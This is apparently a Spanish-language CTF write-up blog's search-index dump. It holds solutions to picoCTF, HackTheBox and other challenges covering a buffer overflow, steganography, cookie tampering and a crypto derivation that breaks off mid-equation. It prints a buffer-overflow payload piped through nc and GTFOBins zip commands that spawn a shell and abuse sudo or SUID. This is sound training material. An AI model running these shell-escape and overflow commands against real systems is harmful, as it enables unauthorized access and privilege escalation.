L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ | |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ / \\^ ^ | |^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ / \\ ^ _ ^ / | | \\^ ^| | ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | // | /_\\ ^| | ____ ____ | | ^ | |^ =|= ^ =================^ ^=|=^| |^=|=^ | | {____}{____} | |^ ^| | ^ ^ ^ ^ | ========= |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ | |^ ^ ^ ^ ^| / ( \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/ %%%%%%%%%%%%%% \\|^ ^| .-----. ^ || ) ||^ ^.-------.-------.^| %%%%%%%%%%%%%%%% | ^ | | |^ ^|| o ) ( o || ^ | | | | /||||||||||||||||\\ |^ ^| | ___ | ^ || | ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ | |'.____'_^||/!\\@@@@@/!\\|| _'______________.'|== ===== |\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" My room is so cluttered... What do you see? code == 0xdeadbeef: how did that happen?? take a flag for your troubles cat: flag.txt: No such file or directory  Genial, enviemos el payload a la instancia remota:\n$ (python3 -c 'import sys; sys.stdout.write(\"A\" * 264)'; echo -e '\\xef\\xbe\\xad\\xde') | nc mars.picoctf.net 31890 ______________________________________________________________________ |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ | |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ / \\^ ^ | |^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ / \\ ^ _ ^ / | | \\^ ^| | ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | // | /_\\ ^| | ____ ____ | | ^ | |^ =|= ^ =================^ ^=|=^| |^=|=^ | | {____}{____} | |^ ^| | ^ ^ ^ ^ | ========= |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ | |^ ^ ^ ^ ^| / ( \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/ %%%%%%%%%%%%%% \\|^ ^| .-----. ^ || ) ||^ ^.-------.-------.^| %%%%%%%%%%%%%%%% | ^ | | |^ ^|| o ) ( o || ^ | | | | /||||||||||||||||\\ |^ ^| | ___ | ^ || | ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ | |'.____'_^||/!\\@@@@@/!\\|| _'______________.'|== ===== |\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" My room is so cluttered... What do you see? code == 0xdeadbeef: how did that happen?? take a flag for your troubles picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/clutter-overflow/","section":"ctf","summary":"picoMini by redpwn. 150 puntos. Binario de 64 bits. Buffer Overflow. Modificación de variables locales","time":4,"title":"clutter-overflow"},{"contents":"Para este reto solamente tenemos una instancia remota a la que conectarnos:\n$ nc 157.245.33.77 31001 [*] Directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv Component List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ [*] Choose component:  Podemos elegir el primero, por ejemplo:\n[*] Choose component: 1 [*] Sub-directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv/Head Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action:  Perfecto, tenemos algunas opciones con las que trabajar.\nVemos que podemos utilizar zip como comando e indicar opciones. Si miramos en GFTObins, descubrimos que existe una manera de conseguir una shell con un parámetro específico.\nTambién se puede hacer uso de mi herramienta gtfobins-cli para ver esta misma información desde la interfaz de línea de comandos:\n$ gtfobins-cli zip zip ==\u0026gt; https://gtfobins.github.io/gtfobins/zip/ Shell It can be used to break out from restricted environments by spawning an interactive system shell. TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #' rm $TF File read It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system. LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF Sudo If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF Limited SUID If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (sh shell to run with SUID privileges. sudo install -m =xs $(which zip) . TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF  Genial, entonces podemos usar -T -TT 'sh #' como opción para obtener una shell. Pero primero tenemos que crear un artefacto, porque no tenemos nada en el directorio de trabajo actual:\n[*] Choose action: 2 /home/ctf/Rm4gXvPOefWkBXd3VYlOQyrGvLEnwNMm/Head total 8 drwxr-sr-x 2 ctf ctf 4096 May 19 00:45 . drwxr-sr-x 6 ctf ctf 4096 May 19 00:45 .. Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 1 Insert name: asdf Insert content: asdf [+] Artifact [asdf] was created successfuly! Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action:  Y ahora podemos usar el GTFOBin para obtener una shell y conseguir la flag:\n[*] Choose action: 4 Insert \u0026lt;name\u0026gt;.zip: asdf Insert \u0026lt;name\u0026gt;: asdf Insert \u0026lt;options\u0026gt;: -T -TT 'sh #' adding: asdf (stored 0%) whoami ctf cd .. ls Hands Head Legs Torso cd .. ls Rm4gXvPOefWkBXd3VYlOQyrGvLEnwNMm artifacts.py clear.py flag.txt cat flag.txt HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/compressor/","section":"ctf","summary":"GTFOBin en comando ZIP","time":2,"title":"Compressor"},{"contents":"Se nos proporciona una página web que pregunta por una cookie:\nMirando en las herramientas de desarrollador, vemos que tenemos una cookie name=-1. Si ponemos snickerdoodle como el campo de texto sugiere, la cookie cambiará a name=0:\nVamos a modificar el valor de la cookie usando curl y mostrar solo el mensaje:\n$ curl mercury.picoctf.net:27177/check -sH 'Cookie: name=0' | grep -oE '\u0026lt;b\u0026gt;.*?\u0026lt;/b\u0026gt;' \u0026lt;b\u0026gt;I love snickerdoodle cookies!\u0026lt;/b\u0026gt;  Ahora vamos a usar un bucle en Bash para ver si algo cambia al poner otro valor como cookie:\n$ for i in {0..20}; do echo -n \"$i: \"; curl mercury.picoctf.net:27177/check -sH \"Cookie: name=$i\" | grep -oE '\u0026lt;b\u0026gt;.*?\u0026lt;/b\u0026gt;'; done 0: \u0026lt;b\u0026gt;I love snickerdoodle cookies!\u0026lt;/b\u0026gt; 1: \u0026lt;b\u0026gt;I love chocolate chip cookies!\u0026lt;/b\u0026gt; 2: \u0026lt;b\u0026gt;I love oatmeal raisin cookies!\u0026lt;/b\u0026gt; 3: \u0026lt;b\u0026gt;I love gingersnap cookies!\u0026lt;/b\u0026gt; 4: \u0026lt;b\u0026gt;I love shortbread cookies!\u0026lt;/b\u0026gt; 5: \u0026lt;b\u0026gt;I love peanut butter cookies!\u0026lt;/b\u0026gt; 6: \u0026lt;b\u0026gt;I love whoopie pie cookies!\u0026lt;/b\u0026gt; 7: \u0026lt;b\u0026gt;I love sugar cookies!\u0026lt;/b\u0026gt; 8: \u0026lt;b\u0026gt;I love molasses cookies!\u0026lt;/b\u0026gt; 9: \u0026lt;b\u0026gt;I love kiss cookies!\u0026lt;/b\u0026gt; 10: \u0026lt;b\u0026gt;I love biscotti cookies!\u0026lt;/b\u0026gt; 11: \u0026lt;b\u0026gt;I love butter cookies!\u0026lt;/b\u0026gt; 12: \u0026lt;b\u0026gt;I love spritz cookies!\u0026lt;/b\u0026gt; 13: \u0026lt;b\u0026gt;I love snowball cookies!\u0026lt;/b\u0026gt; 14: \u0026lt;b\u0026gt;I love drop cookies!\u0026lt;/b\u0026gt; 15: \u0026lt;b\u0026gt;I love thumbprint cookies!\u0026lt;/b\u0026gt; 16: \u0026lt;b\u0026gt;I love pinwheel cookies!\u0026lt;/b\u0026gt; 17: \u0026lt;b\u0026gt;I love wafer cookies!\u0026lt;/b\u0026gt; 18: \u0026lt;b\u0026gt;Flag\u0026lt;/b\u0026gt; 19: \u0026lt;b\u0026gt;I love macaroon cookies!\u0026lt;/b\u0026gt; 20: \u0026lt;b\u0026gt;I love fortune cookies!\u0026lt;/b\u0026gt;  Genial, vemos que name=18 mostrará la flag:\n$ curl mercury.picoctf.net:27177/check -sH 'Cookie: name=18' | grep -oE 'picoCTF{.*?}' picoCTF{3v3ry1_l0v3s_c00k135_064663be}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/picoctf/web-exploitation/cookies/","section":"ctf","summary":"picoCTF 2021. 40 puntos. Modificar cookies","time":1,"title":"Cookies"},{"contents":"Se nos pide calcular el coseno de 42 radianes, redondeado a 6 decimales. Esto es simple:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; import math \u0026gt;\u0026gt;\u0026gt; math.cos(42) -0.39998531498835127 \u0026gt;\u0026gt;\u0026gt; round(math.cos(42), 6) -0.399985 \u0026gt;\u0026gt;\u0026gt; 'ictf{' + str(round(math.cos(42), 6)) + '}' 'ictf{-0.399985}'  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/cos1/","section":"ctf","summary":"ImaginaryCTF 02/08/2022. 30 puntos. Coseno de un número","time":0,"title":"cos1"},{"contents":"Se nos pide calcular el coseno de 42 radianes, redondeado a 10 decimales. Para esto, podemos usar Wolfram Alpha:\nY la flag es:\nictf{-0.3999853149883512939547073371772020283804228791424190606167446601513424425835587794388549191368621883}\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/cos2/","section":"ctf","summary":"ImaginaryCTF 04/08/2022. 30 puntos. Coseno de un número con muchos decimales","time":0,"title":"cos2"},{"contents":"Tenemos el siguiente enunciado:\n The CVE we\u0026rsquo;re looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.\n Se nos pide buscar el identificador de CVE de la primera vulnerabilidad de RCE en Windows Print Spooler Service de 2021. Esta vulnerabilidad se conoce como PrintNightmare, y contiene varios CVE. Pero el que busca este reto es el CVE-2021-34527, por lo que la flag es: picoCTF{CVE-2021-34527}.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/cve-xxxx-xxxx/","section":"ctf","summary":"picoCTF 2022. 100 puntos. Búsqueda de CVE","time":0,"title":"CVE-XXXX-XXXX"},{"contents":"Se nos proporcionan tres imágenes JPEG:\n monalisa.jpg:   Plans.jpg:   Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg:  $ file monalisa.jpg monalisa.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, comment: \"CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 92\", comment: \"Optimized by JPEGmini 3.9.20.0L Internal 0x8c97c7da\", baseline, precision 8, 1280x1936, components 3 $ file Plans.jpg Plans.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 100x100, segment length 16, baseline, precision 8, 800x600, components 3 $ file Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 1x1, segment length 16, baseline, precision 8, 376x490, components 3  Como es una imagen JPEG, podemos pensar en esteganografía usando steghide. De hecho, este método funciona para la tercera imagen (Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg) usando TOM como contraseña:\nObtenemos un texto con una clave 020e60c6a84db8c5d4c2d56a4e4fe082. Esto parece un hash MD5, así que vamos a meterlo en crackstation.net:\nAhora tenemos una contraseña (leonardo). Si miramos las cadenas de texto imprimibles de monalisa.jpg vemos famous.zip al final:\n$ strings -10 monalisa.jpg ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 92 5Optimized by JPEGmini 3.9.20.0L Internal 0x8c97c7da /2.)2\u0026*+) )))))))))))))))))))))))))))))))))))))))))))))))))) #BQaRbq$3r EK:p%q%FvR\\e d'v[{EmXx1 zGToLjg?'} T\\c!`.w0x-B ]. dk*bbJB[\u0026gt;X[e O:V=v,Tee3n-7Y EbqL%g\u0026gt;@Dq$ $A4bIqxctS 8V7:3k/1-0 `SDLKS.etQ _4s{K6!:dW \u0026bXfPKAt-? hwUuAX)WX[ z#iWV(mO)~PL c\u0026lt;[;pg],s{p NbfVh1Y~v\":\u0026gt; vcqlh+tSk( jBWBuFz:V2 k^*kTJ$2LT^BC hQd.!%lJE4 6Yw6L\u0026lt;7(^]i T::Ks\\\"c'e8 ?AE%T*\"+OD Q5N1W-)X@X _JR%\u0026lt;U$ Kx famous.zipUT Mona.jpgUT %=S!dS2GA) NhY`\u0026\u0026lt;kwl3 ia \\2nA{D9x FayU)W^[Ja= 6$}%U.cU(s Mona.jpgUT famous.zipUT  Entonces podemos deducir que el archivo de imagen contiene un archivo ZIP embebido. Podemos verificarlo y extraerlo con binwalk:\n$ binwalk monalisa.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 450363 0x6DF3B Zip archive data, at least v2.0 to extract, uncompressed size: 117958, name: famous.zip 450440 0x6DF88 Zip archive data, encrypted at least v2.0 to extract, compressed size: 117776, uncompressed size: 122869, name: Mona.jpg 568411 0x8AC5B End of Zip archive, footer length: 22 568537 0x8ACD9 End of Zip archive, footer length: 22 $ binwalk -e monalisa.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 450363 0x6DF3B Zip archive data, at least v2.0 to extract, uncompressed size: 117958, name: famous.zip 450440 0x6DF88 Zip archive data, encrypted at least v2.0 to extract, compressed size: 117776, uncompressed size: 122869, name: Mona.jpg 568411 0x8AC5B End of Zip archive, footer length: 22 568537 0x8ACD9 End of Zip archive, footer length: 22 $ ls _monalisa.jpg.extracted/ 6DF3B.zip famous.zip  Y aquí tenemos un archivo ZIP que contiene otra imagen JPEG llamada Mona.jpg:\n$ file _monalisa.jpg.extracted/famous.zip _monalisa.jpg.extracted/famous.zip: Zip archive data, at least v2.0 to extract $ unzip -l _monalisa.jpg.extracted/famous.zip Archive: _monalisa.jpg.extracted/famous.zip Length Date Time Name --------- ---------- ----- ---- 122869 2017-09-22 20:57 Mona.jpg --------- ------- 122869 1 file  El archivo ZIP está encriptado, pero tenemos la contraseña: (leonardo):\n$ unzip -P leonardo _monalisa.jpg.extracted/famous.zip Archive: _monalisa.jpg.extracted/famous.zip inflating: Mona.jpg $ file Mona.jpg Mona.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 612x612, components 3  Antes de analizar esta nueva imagen, podemos echar un vistazo a Plans.jpg. Aquí encontramos una URL en los caracteres imprimibles del archivo:\n$ strings -10 Plans.jpg //33//@@@@@@@@@@@@@@@ #0+.'''.+550055@@?@@@@@@@@@@@@ ?:Vn.$R0!B@X2 rLXn0~uHg*T zS?jh_{3\u0026! nI\"L(oK'b4 zX^(1*cxY3: (CDRYFLD8, RN;m@. VebJ https://www.youtube.com/watch?v=jc1Nfx4c5LQ  Esta URL lleva a un vídeo de YouTube llamado \u0026ldquo;Guernica 3D\u0026rdquo;, y trata sobre este cuadro famoso de Picasso.\nDe hecho, podemos usar Guernica como contraseña para steghide en Mona.jpg:\nY obtenemos una cadena de texto que parece codificada en Base64 (de hecho, varias veces). Y aquí está la flag:\n$ echo VTBaU1EyVXdNSGRpYTBKbVZFUkdObEZHT0doak1UbEZUVEJDUldaUlBUMD0= | base64 -d U0ZSQ2UwMHdia0JmVERGNlFGOGhjMTlFTTBCRWZRPT0= $ echo VTBaU1EyVXdNSGRpYTBKbVZFUkdObEZHT0doak1UbEZUVEJDUldaUlBUMD0= | base64 -d | base64 -d SFRCe00wbkBfTDF6QF8hc19EM0BEfQ== $ echo VTBaU1EyVXdNSGRpYTBKbVZFUkdObEZHT0doak1UbEZUVEJDUldaUlBUMD0= | base64 -d | base64 -d | base64 -d HTB{M0n@_L1z@_!s_D3@D}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/da-vinci/","section":"ctf","summary":"Hash MD5. Esteganografía con steghide y binwalk","time":2,"title":"Da Vinci"},{"contents":"Se nos proporciona una URL para interactuar con ella. Vamos a usar curl para ello:\n$ curl 165.227.106.113/header.php Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/7.81.0 \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt;  Parece que tenemos que utilizar un agente de usuario concreto (a lo mejor funciona con Sup3rS3cr3tAg3nt):\n$ curl 165.227.106.113/header.php -H 'User-Agent: Sup3rS3cr3tAg3nt' Sorry, it seems as if you did not just come from the site, \"awesomesauce.com\". \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt;  Y ahora necesitamos decirle a la web que la petición viene desde awesomesauce.com. Esto se indica con el referente, vamos a añadirlo y a conseguir la flag:\n$ curl 165.227.106.113/header.php -H 'User-Agent: Sup3rS3cr3tAg3nt' -H 'Referer: awesomesauce.com' Here is your flag: CTFlearn{did_this_m3ss_with_y0ur_h34d} \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt;  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/ctflearn/web/dont-bump-your-header/","section":"ctf","summary":"HTTP request headers","time":0,"title":"Don't Bump Your Head(er)"},{"contents":"Se nos proporciona un código en Python para cifrar la flag, y el correspondiente archivo out.txt:\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_long from Crypto.Util.Padding import pad import os FLAG = b\"HTB{--REDACTED--}\" def getPrimes(coefficient): while True: a = getPrime(512) p = 3 * coefficient * a + 2 if isPrime(p): break while True: b = getPrime(512) q = 3 * coefficient * b + 2 if isPrime(q): break return p, q def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 256)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) def main(): coefficient = getPrime(128) out = \"\" message = FLAG[0:len(FLAG)//2] n1, c1, c2 = encrypt(message, coefficient) out += f\"{n1}\\n{c1}\\n{c2}\\n\" message = FLAG[len(FLAG)//2:] n2, c3, c4 = encrypt(message, coefficient) out += f\"{n2}\\n{c3}\\n{c4}\\n\" out += f\"{len(FLAG)}\" with open(\"out.txt\", \"w\") as f: f.write(out) if __name__ == '__main__': main()  19776862259930835769533075141648724317136726865325219582974628641663028757626265811083579217562652521882819442186121072998911507994180202653223643709290080839913395525826127153190928840827396123760992080649033993986933259414523207699646834981906819263319717393978144309193843291629147724979917210633945695963741292906203710063193032172565935616940163881309010593278779797311032854042143 18940449739373929782738747330951086701639920358124022449285915914681280430796481828627299763135820762855030234173393995786612606880441619894387463477558992819159868677736220547584576162287130594708254787956440732197673909613467337841562238900614238638819659960733399020443364866675611439229048487547611412841048501574753238490324081535533435151621545695715920828646120795059085207687562 8139131820890905559667838555211733555742225714065473904284826530490173193882559461890851501765452084252909412188575022633596512451349296562551141247433279875212083704533696867645657058965269748533381751261887853181791035505421692256731545740535452608088572835061213186774986415770477686449034066741760771862922788827235376073691257160953903839272893965131226612277505938410382901008254 26981290975895303933094134784682647576666219028610175215312705398803184876873073206073503314367717924247311343215620922642215797499997039996235807898656819655954778538207489354154710796202412578870511364360408739855039573753404337104901925571890067221867326539447741757218265017060345184819121122211405292705642802582423249795098475142694876497945367191724577275836649641722277321440333 11417442976137891276889457530453693512824297007151561589652706330477531354073557298919952168938641673547415923544612769937040826488039629275033613885416852757446100888628373584968290007182319967658770715301605453943639269415203462531753249668211460008832837924575003999865632991329309338991536326471187269457640505585240846158952935988441171094886116683100214189858525596159931001818615 18355127503780127719693553150263322113757549849264731376621241697648137569897555203319854095104524520716185245672659763235856966677160994023952943459682923666302498240656511471051133821432105321005228730688019003306690750456433049212247022010356640992865785005342800448602013572898416040572578635571772069565860571397553306232025854213437948953083273924864099046923310816080854899416432 186  En primer lugar, vemos que el programa coge un número primo de 128 bits llamado coefficient para generar otros números primos $p$ y $q$. Sea $C$ el valor de coefficient, entonces los números primos $p$ y $q$ se calculan como:\n$$ p = 3 a C + 2 $$\n$$ q = 3 b C + 2 $$\nDonde $a$ y $b$ son números primos de 512 bits. Usando este método extraño, tenemos dos módulos: $n_1$ y $n_2$. Por tanto, seremos capaces de encontrar el valor de $C$ porque es común a ambos módulos. Sean $p_i = 3 a_i C + 2$ y $q_i = 3 b_i C + 2$, entonces:\n$$ \\begin{equation} \\begin{split} n_i \u0026amp;= p_i \\cdot q_i \\\\ \u0026amp;= (3 a_i C + 2) \\cdot (3 b_i C + 2) \\\\ \u0026amp;= 9 a_i b_i C^2 + 6 a_i C + 6 b_i C + 4 \\end{split} \\end{equation} $$\nNótese que:\n$$ \\begin{equation} \\begin{split} n_i - 4 \u0026amp;= 9 a_i b_i C^2 + 6 a_i C + 6 b_i C \\\\ \u0026amp;= 3 C \\cdot (3 a_i b_i C + 2 a_i + 2 b_i) \\end{split} \\end{equation} $$\nComo tenemos $n_1$ y $n_2$, entonces $3 C = \\gcd{(n_1 - 4, n_2 - 4)}$, por lo que\n$$ C = \\frac{\\gcd{(n_1 - 4, n_2 - 4)}}{3} $$\nGenial, ahora vamos a ver cómo se calculan los textos cifrados $c_1$ y $c_2$ (el procedimiento es el mismo para $c_3$ y $c_4$). Sea $m_1$ la primera mitad de la flag:\n$$ \\begin{equation} \\begin{split} c_1 \u0026amp;\\equiv m_1 \\cdot (m_1 + C) \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1^2 + m_1 C \\pmod{n_1} \\end{split} \\end{equation} $$\n$$ \\begin{equation} \\begin{split} c_2 \u0026amp;\\equiv \\mathrm{pad}\\, (m_1, 256) \\cdot \\left(\\mathrm{pad}\\, (m_1, 256) + \\cdot C\\right) \\pmod{n_1} \\\\ \u0026amp;\\equiv \\mathrm{pad}\\, (m_1, 256)^2 + \\mathrm{pad}\\, (m_1, 256) \\cdot C \\pmod{n_1} \\end{split} \\end{equation} $$\nLa función pad añade más bytes al mensaje de manera predecible (PKCS7). Por ejemplo, si un mensaje de 12 bytes se rellena hasta 16 bytes, el relleno serán 4 bytes \\x04. Aquí hay algunos ejemplos:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.Padding import pad \u0026gt;\u0026gt;\u0026gt; pad(b'A' * 12, 16) b'AAAAAAAAAAAA\\x04\\x04\\x04\\x04' \u0026gt;\u0026gt;\u0026gt; pad(b'A' * 10, 16) b'AAAAAAAAAA\\x06\\x06\\x06\\x06\\x06\\x06' \u0026gt;\u0026gt;\u0026gt; pad(b'A' * 1, 16) b'A\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f'  Podemos expresar la función pad en términos matemáticos como sigue, siendo $L$ la longitud del mensaje:\n$$ \\mathrm{pad}\\,(m_i, 256) = m_i \\cdot 256 ^ {256 - L} + P $$\nY $P$ (el relleno) sigue la siguiente expresión. Por motivos de simplificación, sea $K = 256 - L$:\n$$ P = K \\cdot (1 + 256 + 256^2 + \\dots + 256^{K - 1}) $$\nQue es la suma de una progressión geométrica, que equivale a\n$$ P = K \\cdot \\frac{256^K - 1}{256 - 1} $$\nPor tanto, podemos expresar $c_2$ como\n$$ \\begin{equation} \\begin{split} c_2 \u0026amp;\\equiv \\mathrm{pad}\\, (m_1, 256)^2 + \\mathrm{pad}\\, (m_1, 256) \\cdot C \\pmod{n_1} \\\\ \u0026amp;\\equiv \\left(m_1 \\cdot 256 ^ K + P\\right)^2 + \\left(m_1 \\cdot 256^K + P\\right) \\cdot C \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1^2 \\cdot 256 ^{2 K} + 2 m_1 P \\cdot 256^K + P^2 + m_1 C \\cdot 256^K + P C \\pmod{n_1} \\end{split} \\end{equation} $$\nAhora podemos mover algunos términos:\n$$ c_2 - P^2 - P C \\equiv m_1^2 \\cdot 256 ^{2 K} + 2 m_1 P \\cdot 256^K + m_1 C \\cdot 256^K \\pmod{n_1} $$\n$$ c_2 - P^2 - P C \\equiv 256^K \\cdot (m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C) \\pmod{n_1} $$\n$$ (c_2 - P^2 - P C) \\cdot \\left(256^K\\right)^{-1} \\equiv m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C \\pmod{n_1} $$\nVamos a definir $X$ como\n$$ \\begin{equation} \\begin{split} X \u0026amp;:= (c_2 - P^2 - P C) \\cdot \\left(256^K\\right)^{-1} \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C \\pmod{n_1} \\end{split} \\end{equation} $$\nPodemos olvidarnos de $m_1^2 \\cdot 256^K$ si restamos $c_1 \\cdot 256^K$:\n$$ \\begin{equation} \\begin{split} X \u0026amp;- c_1 \\cdot 256^K \\equiv \\\\ \u0026amp;\\equiv (m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C) - c_1 \\cdot 256^K \\pmod{n_1} \\\\ \u0026amp;\\equiv (m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C) - 